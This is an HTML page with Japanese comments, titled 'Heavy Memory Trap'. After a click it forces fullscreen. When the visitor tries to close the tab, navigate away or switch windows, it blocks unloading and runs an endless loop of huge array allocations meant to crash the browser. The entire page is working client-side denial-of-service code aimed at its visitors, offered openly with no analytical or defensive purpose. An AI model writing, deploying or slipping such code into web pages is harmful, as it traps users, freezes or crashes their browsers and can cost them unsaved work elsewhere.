<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Heavy Memory Trap</title>
    <style>
        body {
            margin: 0;
            background-color: #0b0f19;
            color: #38bdf8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
            cursor: pointer;
            user-select: none;
        }
        h1 {
            font-size: 2.2rem;
            text-align: center;
            text-shadow: 0 0 10px #0284c7;
        }
    </style>
</head>
<body>

    <h1>CLICK TO ARM TRAP</h1>

    <script>
        let isArmed = false;

        // 実行のトリガー（クリックしてフルスクリーン＆罠を有効化）
        document.body.addEventListener('click', async () => {
            try {
                await document.documentElement.requestFullscreen();
            } catch (err) {}

            isArmed = true;
            document.querySelector('h1').innerText = "TRAP ARMED.\nTry to leave or close this tab.";
        });

        // 離脱・閉じる動作を検知した瞬間に発動する極悪処理
        function triggerMemoryBomb() {
            if (!isArmed) return;

            // 巨大な配列を無限に生成し続けてメモリを限界までアロケートする
            // 処理が重すぎてブラウザのタブやウィンドウがそのまま力尽きる
            const memoryLeakMonster = [];
            while (true) {
                // 1回につき数MB〜数十MBの文字列や配列を爆誕させる
                memoryLeakMonster.push(new Array(10000000).fill(Math.random()));
            }
        }

        // タブを閉じようとしたり別のページに移動しようとした瞬間
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
            triggerMemoryBomb();
        });

        // フォーカスが外れた（他のウィンドウやタブに逃げようとした）瞬間
        window.addEventListener('blur', () => {
            triggerMemoryBomb();
        });
    </script>

</body>
</html>
